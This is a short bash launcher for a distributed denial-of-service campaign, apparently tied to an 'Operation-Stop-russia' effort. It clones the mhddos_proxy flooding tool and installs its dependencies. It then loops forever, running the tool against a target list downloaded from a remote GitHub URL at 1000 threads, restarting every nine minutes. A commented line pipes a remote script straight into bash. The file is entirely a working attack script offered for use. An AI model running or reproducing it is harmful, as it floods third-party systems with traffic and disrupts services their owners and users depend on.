#!/bin/bash
#curl -l https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/ALL.sh | bash
rm -rf mhddos_proxy
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd mhddos_proxy
python3 -m pip install -r requirements.txt

while true
do
   pkill -f runner.py
   sleep 5
   python3 runner.py -c https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/AllTargets.lst -t 1000 --rpc 500 --debug
sleep 9m
done
